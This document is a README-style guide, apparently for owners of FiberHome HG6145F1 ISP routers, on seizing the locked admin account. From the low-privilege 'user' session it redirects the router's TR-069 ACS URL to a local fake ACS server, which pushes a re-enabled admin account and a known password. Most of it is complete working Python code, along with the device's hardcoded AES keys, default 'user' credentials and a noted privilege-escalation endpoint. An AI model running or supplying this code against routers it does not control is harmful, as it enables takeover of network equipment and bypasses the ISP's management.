# FiberHome HG6145F1 — Admin Account Recovery via Fake ACS + CWMP

## The Problem

The ISP's ACS (Auto Configuration Server) can remotely:

1. **Disable the admin account** (`Enable=0`) — making `login_result: 4` for ALL passwords
2. **Change the admin password** — via `WebSuperPassword` parameter
3. The `user` account remains accessible but cannot change admin password via `admin_management` without knowing the current admin password (`errorCode: -4`)

Result: admin account is completely locked. User account is read-only for admin operations.

## The Solution

Use a **fake ACS server** to send `SetParameterValues` via CWMP (TR-069), setting `Enable=1` + a known `WebSuperPassword`.

### Why This Works

The CPE (Customer Premises Equipment) initiates the CWMP connection to its configured ACS URL. We can:

1. From the `user` session, change the ACS URL to point to our fake ACS
2. Enable CWMP (`EnableCWMP=1`)
3. Start a fake ACS server on our machine
4. When the CPE connects, respond with `SetParameterValues` to re-enable the admin account and set a known password
5. The CPE accepts the parameters and stores them
6. Clean up: restore the real ACS URL, disable CWMP

## Requirements

- Working `user` session (`user:user1234`)
- PC on the same LAN (or reachable from the CPE's WAN side)
- Python with `requests` + `pycryptodome`

## Step-by-Step

### 1. Start the Fake ACS Server

```python
import socket
import re

ACS_PORT = 19090

SOAP_INFORM_RESPONSE = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<SOAP-ENV:Header>
<cwmp:ID SOAP-ENV:mustUnderstand="1">REPLACE_ID</cwmp:ID>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<cwmp:InformResponse>
<MaxEnvelopes>1</MaxEnvelopes>
</cwmp:InformResponse>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""

SOAP_SET_PARAMS = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<SOAP-ENV:Header>
<cwmp:ID SOAP-ENV:mustUnderstand="1">REPLACE_ID</cwmp:ID>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<cwmp:SetParameterValues>
<ParameterList SOAP-ENC:arrayType="cwmp:ParameterValueStruct[2]">
<ParameterValueStruct>
<Name>InternetGatewayDevice.DeviceInfo.X_FH_Account.X_FH_WebUserInfo.Enable</Name>
<Value xsi:type="xsd:string">1</Value>
</ParameterValueStruct>
<ParameterValueStruct>
<Name>InternetGatewayDevice.DeviceInfo.X_FH_Account.X_FH_WebUserInfo.WebSuperPassword</Name>
<Value xsi:type="xsd:string">admin123</Value>
</ParameterValueStruct>
</ParameterList>
<ParameterKey>FakeACS</ParameterKey>
</cwmp:SetParameterValues>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""

def make_http(body):
    return (f"HTTP/1.1 200 OK\r\n"
            f"Content-Type: text/xml; charset=utf-8\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Server: FakeACS/1.0\r\n\r\n{body}")

def recv_all(conn, timeout=10):
    conn.settimeout(timeout)
    data = b""
    while True:
        try:
            c = conn.recv(4096)
            if not c: break
            data += c
            if b"</SOAP-ENV:Envelope>" in data: break
        except:
            break
    return data

def acs_server():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", ACS_PORT))
    srv.listen(5)
    srv.settimeout(120)
    print(f"[ACS] Waiting on port {ACS_PORT}")
    conn, addr = srv.accept()
    print(f"[ACS] CPE from {addr}")

    # Phase 1: CPE sends Inform
    d1 = recv_all(conn, 10)
    t1 = d1.decode("utf-8", errors="replace")
    m = re.search(r"<cwmp:ID[^>]*>(.*?)</cwmp:ID>", t1, re.DOTALL)
    cid = m.group(1) if m else "1"
    print(f"[ACS] Inform ID={cid}")

    # Respond with InformResponse
    resp = SOAP_INFORM_RESPONSE.replace("REPLACE_ID", cid)
    conn.sendall(make_http(resp).encode())
    print("[ACS] Sent InformResponse")

    # Phase 2: CPE sends empty POST (ready for ACS commands)
    d2 = recv_all(conn, 8)
    if not d2:
        return
    t2 = d2.decode("utf-8", errors="replace")
    m2 = re.search(r"<cwmp:ID[^>]*>(.*?)</cwmp:ID>", t2, re.DOTALL)
    cid2 = m2.group(1) if m2 else "2"

    # Send SetParameterValues with PLAINTEXT password + Enable=1
    set_body = SOAP_SET_PARAMS.replace("REPLACE_ID", cid2)
    conn.sendall(make_http(set_body).encode())
    print("[ACS] Sent SetParameterValues (Enable=1, admin123)")

    # Phase 3: CPE responds with SetParameterValuesResponse
    d3 = recv_all(conn, 5)
    if d3:
        t3 = d3.decode("utf-8", errors="replace")
        if "SetParameterValuesResponse" in t3:
            print("[ACS] SUCCESS: CPE accepted parameters!")

    conn.close()
    srv.close()
```

### 2. Configure CPE to Connect to Our ACS

```python
import requests
from Crypto.Cipher import AES

BASE = "http://192.168.1.1"
KEY_FH_CBC = bytes([i + 0x6f for i in range(16)])  # AES-CBC key

def fhencrypt(pwd):
    c = AES.new(KEY_FH_CBC, AES.MODE_CBC, KEY_FH_CBC)
    r = pwd.encode()
    p = 16 - (len(r) % 16)
    return c.encrypt(r + bytes([p] * p)).hex().upper()

# Login as user
s = requests.Session()
s.get(BASE + "/fh")
sid = s.get(BASE + "/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_=1").json()["sessionid"]
s.post(BASE + "/cgi-bin/ajax",
    data=f"username=user&loginpd={fhencrypt('user1234')}&port=0&sessionid={sid}&ajaxmethod=do_login",
    headers={"Content-Type": "application/x-www-form-urlencoded"})

def gsid():
    return s.get(BASE + "/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_=" +
                 str(__import__("random").random())).json()["sessionid"]

# Set ACS URL to our fake server
sid = gsid()
s.post(BASE + "/cgi-bin/ajax",
    data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=info"
         f"&URL=http://192.168.1.3:19090/"
         f"&Username=acs@acs.telkom.net"
         f"&PeriodicInformEnable=1&PeriodicInformInterval=10",
    headers={"Content-Type": "application/x-www-form-urlencoded"})

# Enable CWMP
sid = gsid()
s.post(BASE + "/cgi-bin/ajax",
    data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=enable&EnableCWMP=1",
    headers={"Content-Type": "application/x-www-form-urlencoded"})

print("[SETUP] CPE will connect to fake ACS shortly")
```

### 3. Verify Admin Login

```python
# After CPE connects and SetParameterValues completes:
s2 = requests.Session()
s2.get(BASE + "/fh")
sid2 = s2.get(BASE + "/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_=1").json()["sessionid"]
r = s2.post(BASE + "/cgi-bin/ajax",
    data=f"username=admin&loginpd={fhencrypt('admin123')}&port=0&sessionid={sid2}&ajaxmethod=do_login",
    headers={"Content-Type": "application/x-www-form-urlencoded"})
print(f"admin/admin123 -> login_result: {r.json()['login_result']}")
# Expected: login_result: 0 (success)
```

### 4. Cleanup

```python
# Restore real ACS URL
sid = gsid()
s.post(BASE + "/cgi-bin/ajax",
    data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=info"
         f"&URL=http://acs-new.telkom.net:9090/web/tr069"
         f"&Username=acs@acs.telkom.net"
         f"&PeriodicInformEnable=1&PeriodicInformInterval=10048",
    headers={"Content-Type": "application/x-www-form-urlencoded"})

# Disable CWMP again
sid = gsid()
s.post(BASE + "/cgi-bin/ajax",
    data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=enable&EnableCWMP=0",
    headers={"Content-Type": "application/x-www-form-urlencoded"})
```

## Key Insights

### 1. Plaintext Password in SetParameterValues

The `WebSuperPassword` value must be sent as **plaintext**, NOT AES-encrypted:

```xml
<!-- CORRECT: plaintext -->
<Value xsi:type="xsd:string">admin123</Value>

<!-- WRONG: CPE will double-encrypt this -->
<Value xsi:type="xsd:string">A1E5D34022767688617CC9FBC0AEE256</Value>
```

The CPE internally encrypts the password using AES-128-ECB with key `ABCDEFGHIJKLMNOP` before storing to its config file (`/etc/config/InternetGatewayDevice`). If you send an already-encrypted value, it encrypts it again — resulting in a broken password.

### 2. Enable Flag Matters

The ACS can set `Enable=0` on the admin account, which makes **all passwords** return `login_result: 4` (account disabled). You MUST send both:

```
Enable=1
WebSuperPassword=admin123
```

Without `Enable=1`, changing the password alone won't unlock the account.

### 3. CWMP Data Model Paths

```
InternetGatewayDevice.DeviceInfo.X_FH_Account.X_FH_WebUserInfo.Enable
InternetGatewayDevice.DeviceInfo.X_FH_Account.X_FH_WebUserInfo.WebSuperPassword
```

These correspond to the UCI config section:
```
config interface 'InternetGatewayDevice__DeviceInfo__X_FH_Account__X_FH_WebUserInfo__'
    option Enable '1'
    option WebSuperPassword '<AES-ECB encrypted>'
```

### 4. CWMP Flow

```
CPE → ACS: HTTP POST with SOAP Inform (device info)
ACS → CPE: HTTP 200 with SOAP InformResponse
CPE → ACS: HTTP POST (empty body — ready for commands)
ACS → CPE: HTTP 200 with SOAP SetParameterValues
CPE → ACS: HTTP POST with SOAP SetParameterValuesResponse
ACS → CPE: HTTP 200 with empty SOAP envelope (session end)
```

The CPE initiates the connection, but the ACS sends the commands. After each ACS command, the CPE responds and then waits for the next command. The session ends when the ACS sends an empty envelope.

### 5. TR-069 Runs on WAN Interface

The CPE's TR-069 client connects from the **WAN IP** (10.5.x.x in this case, on VLAN 1085), not the LAN IP (192.168.1.1). This means:

- The fake ACS server must be reachable from the WAN side
- If the PC is on LAN, the router's NAT must allow the connection
- In practice, the CPE successfully connected to 192.168.1.3:19090 from 10.5.72.61 — meaning traffic from WAN to LAN is allowed (hairpin NAT or routing)

### 6. CPE's Internal Encryption

The router uses two different AES modes:

| Context | Algorithm | Key |
|---------|-----------|-----|
| Web login / admin_management | AES-128-CBC | `opqrstuvwxyz{|}~` (0x6f-0x7e) |
| Config file storage (WebSuperPassword) | AES-128-ECB | `ABCDEFGHIJKLMNOP` |

## Changing Admin Password After Recovery

Once admin is restored, you can change the password via `admin_management`. The parameters must be:

- `username` (lowercase!)
- `old_password` = AES-CBC encrypted current password
- `new_password` = AES-CBC encrypted new password

```python
sid = s.get(BASE + "/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_=r").json()["sessionid"]
r = s.post(BASE + "/cgi-bin/ajax",
    data=f"ajaxmethod=admin_management&sessionid={sid}"
         f"&username=admin"
         f"&old_password={fhencrypt('admin123')}"
         f"&new_password={fhencrypt('newpassword123')}",
    headers={"Content-Type": "application/x-www-form-urlencoded"})
# Response: {"session_valid": 1, "success": "true"}
```

This endpoint was originally discovered as a **privilege escalation vector** — user sessions could call it without session-level validation. But the `old_password` must still match the current admin password (validated server-side), so it's only useful if you know or can guess the current admin password.

## Preventing ACS from Locking You Out Again

After recovery, **disable CWMP** to prevent ACS from pushing changes:

```python
sid = gsid()
s.post(BASE + "/cgi-bin/ajax",
    data="ajaxmethod=set_tr69_info&sessionid={sid}&method=enable&EnableCWMP=0",
    headers={"Content-Type": "application/x-www-form-urlencoded"})
```

This can be done from both `admin` and `user` sessions. When CWMP is disabled (EnableCWMP=0), the ACS cannot reach the CPE or change its settings.

## Requirements

- Python 3.6+
- `requests`
- `pycryptodome` (for AES encryption)
- Network access to the FiberHome HG6145F1 router
- Working `user` credentials (default: `user`/`user1234`)

## Files

| File | Purpose |
|------|---------|
| `fh-config-utility.py` | Decrypt/encrypt config files and individual password values |
| `FiberHome-HG6145F1-Password-Generator/generator.py` | Generate MAC-based default passwords |
| `fake_acs_v7.py` | Working fake ACS server with plaintext password + Enable=1 |

## Related Endpoints

| Endpoint | Method | Purpose | Access |
|----------|--------|---------|--------|
| `do_login` | POST | Authentication | public |
| `set_tr69_info` | POST | Change ACS URL, enable/disable CWMP | user, admin |
| `get_tr69_info` | POST | View TR-069 config | user, admin |
| `admin_management` | POST | Change admin password | user, admin |
| `setWlanControl` | POST | Configure WiFi (TX power, SSID) | user, admin |
| `getWlanControl` | POST | Read WiFi config | user, admin |
